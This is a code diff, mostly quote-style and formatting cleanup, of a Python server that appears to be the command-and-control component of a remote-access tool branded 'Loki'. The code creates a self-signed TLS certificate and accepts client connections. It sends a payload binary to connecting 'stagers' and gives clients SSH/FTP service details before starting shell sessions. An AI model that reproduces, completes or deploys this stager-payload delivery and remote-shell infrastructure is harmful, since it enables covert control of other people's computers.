@@ -11,11 +11,10 @@ from queue import Queue
 from OpenSSL import crypto
 from random import SystemRandom
 from threading import Thread, RLock
-from . lib import session, shell, interface
+from .lib import session, shell, interface
 
 
 class Server(object):
-
     def __init__(self):
         self.interface = interface.Interface()
         self.waiting_conn = Queue()
@@ -32,24 +31,24 @@ class Server(object):
         key_pair.generate_key(crypto.TYPE_RSA, 2048)
 
         cert = crypto.X509()
-        cert.get_subject().O = 'Loki'
-        cert.get_subject().CN = 'Sami'
-        cert.get_subject().OU = 'Pure-L0G1C'
-        cert.get_subject().C = 'US'
-        cert.get_subject().L = 'Los Santos'
-        cert.get_subject().ST = 'California'
+        cert.get_subject().O = "Loki"
+        cert.get_subject().CN = "Sami"
+        cert.get_subject().OU = "Pure-L0G1C"
+        cert.get_subject().C = "US"
+        cert.get_subject().L = "Los Santos"
+        cert.get_subject().ST = "California"
 
-        cert.set_serial_number(SystemRandom().randint(2048 ** 8, 4096 ** 8))
+        cert.set_serial_number(SystemRandom().randint(2048**8, 4096**8))
         cert.gmtime_adj_notBefore(0)
         cert.gmtime_adj_notAfter(256 * 409600)
         cert.set_issuer(cert.get_subject())
         cert.set_pubkey(key_pair)
-        cert.sign(key_pair, 'sha256')
+        cert.sign(key_pair, "sha256")
 
-        with open(const.CERT_FILE, 'wb') as f:
+        with open(const.CERT_FILE, "wb") as f:
             f.write(crypto.dump_certificate(crypto.FILETYPE_PEM, cert))
 
-        with open(const.KEY_FILE, 'wb') as f:
+        with open(const.KEY_FILE, "wb") as f:
             f.write(crypto.dump_privatekey(crypto.FILETYPE_PEM, key_pair))
 
     def server_start(self):
@@ -73,7 +72,7 @@ class Server(object):
             self.server = context.wrap_socket(sock, server_side=True)
             self.services_start()
         except OSError:
-            self.display_text('Error: invalid IP')
+            self.display_text("Error: invalid IP")
             self.port = None
             self.ip = None
         finally:
@@ -100,13 +99,8 @@ class Server(object):
             try:
                 with self.lock:
                     services = {
-                        'ssh': {
-                            'ip': const.PUBLIC_IP,
-                            'port': const.SSH_PORT
-                        }, 'ftp': {
-                            'ip': const.PUBLIC_IP,
-                           'port': const.FTP_PORT
-                        }
+                        "ssh": {"ip": const.PUBLIC_IP, "port": const.SSH_PORT},
+                        "ftp": {"ip": const.PUBLIC_IP, "port": const.FTP_PORT},
                     }
 
                     sess_obj.send(args=services)
@@ -122,14 +116,13 @@ class Server(object):
         shell_thread.start()
 
     def send_payload(self, sess):
-        '''Send payload to stager
-        '''
+        """Send payload to stager"""
 
         if not path.exists(const.PAYLOAD_PATH):
-            print('Payload binary does not exist; please generate it')
+            print("Payload binary does not exist; please generate it")
             return
 
-        with open(const.PAYLOAD_PATH, 'rb') as f:
+        with open(const.PAYLOAD_PATH, "rb") as f:
             while True:
                 data = f.read(const.BLOCK_SIZE)
 
@@ -141,23 +134,23 @@ class Server(object):
     def examine_conn(self, s, conn_info):
 
         if type(conn_info) != dict:
-            print('Client did not supply a proper data type')
+            print("Client did not supply a proper data type")
             return
 
-        if not 'code' in conn_info or not 'args' in conn_info:
-            print('Client did not supply both code and args')
+        if not "code" in conn_info or not "args" in conn_info:
+            print("Client did not supply both code and args")
             return
 
-        if conn_info['code'] == None:
-            print('Client supplied no code')
+        if conn_info["code"] == None:
+            print("Client supplied no code")
             return
 
-        if conn_info['code'] == const.STAGER_CODE:
+        if conn_info["code"] == const.STAGER_CODE:
             self.send_payload(s.session)
             return
 
-        if conn_info['code'] == const.CONN_CODE:
-            print('Establishing a secure connection ...')
+        if conn_info["code"] == const.CONN_CODE:
+            print("Establishing a secure connection ...")
             self.manage_conn_info(s, conn_info)
 
     def establish_conn(self, sess, ip):
@@ -192,12 +185,12 @@ class Server(object):
         server_loop.start()
         conn_manager.start()
 
-        print('Server started successfully')
+        print("Server started successfully")
 
     # -------- UI -------- #
 
     def display_text(self, text):
-        print('{0}{1}{0}'.format('\n\n\t', text))
+        print("{0}{1}{0}".format("\n\n\t", text))
 
     def start(self, ip, port):
         if self.is_active:
